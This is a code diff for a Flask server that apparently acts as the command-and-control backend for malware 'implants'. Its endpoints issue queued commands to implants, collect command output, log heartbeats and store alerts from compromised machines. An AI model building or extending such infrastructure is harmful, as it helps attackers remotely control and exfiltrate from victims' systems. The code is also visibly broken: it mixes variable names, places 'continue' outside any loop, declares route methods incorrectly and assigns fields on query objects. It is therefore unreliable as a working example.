@@ -10,7 +10,7 @@ from sqlalchemy.exc import IntegrityError
 from werkzeug.security import check_password_hash, generate_password_hash
 
 from .db import db
-from .models import Implant , Command
+from .models import Implant , Command , Alert
 
 bp = Blueprint('implant', __name__)
 
@@ -81,13 +81,75 @@ def get_next_command():
             impl_id = request.json["implant_id"]
 
             if impl_id:
-                commands = Command..query.filter(implant_id=imp_id)
-
-
+                commands = Command.query.filter(implant_id=imp_id,status="not_taken_by_implant")
+                if commands:
+                    first_value = commands.first()
+                    command = first_value.command_text
+                    now = datetime.now()
+                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
+                    cmd_id = first_value.command_id
+                    first_value.time_issued = current_date_time
+                    first_value.status="taken_by_implant"
+                    db.session.commit()
+                    return jsonify({"command_id" : cmd_id, "command": command})
+                else:
+                    return jsonify({"command_id": -1 ,"command": "No command"})
         except:
             continue
 
 
+@bp.route('/sendCommandResult', methods=('POST'))
+def store_command_results():
+    if request.method == 'POST':
+        try:
+            impl_id = request.json["implant_id"]
+            cmd_id = request.json["command_id"]
+            result = request.json["result"]
 
-                
+            if impl_id:
+                commands = Command.query.filter(implant_id=imp_id,status="taken_by_implant",
+                                                command_id=cmd_id)
+                if commands:
+                    commands.command_result = result
+                    command.status = "completed"
+                    db.session.commit()
+                    return jsonify({"status": "Result posted"})
+                else:
+                    return jsonify({"status": "Error in posting result"})
+        except:
+            continue
+
+@bp.route('/hearbeat', methods=('POST'))
+def heartbeat():
+    if request.method == 'POST':
+        try:
+            imp_id = request.json['implant_id']
+            try:
+                implant = Implant.query.filter(implant_id=imp_id)
+                now = datetime.now()
+                current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
+                implant.last_seen = current_date_time
+                return jsonify({"status":"keep Alive"})
+            except:
+                return jsonify({"status" : "register first"})
+        except:
+            continue
+
+@bp.route('/alert', methods=('POST'))
+def alert():
+    if request.method =='POST':
+        try:             
+            imp_id = request.json['implant_id']
+            alert = request.json['alert']
+            try:
+                now = datetime.now()
+                current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
+                alert = Alert(implant_id=imp_id,time_reported=current_date_time,alert=alert)
+                return jsonify({"status":"Alert Registered"})
+            except:
+                return jsonify({"status":"Bad alert"})
+        except:
+           continue  
+
+
 
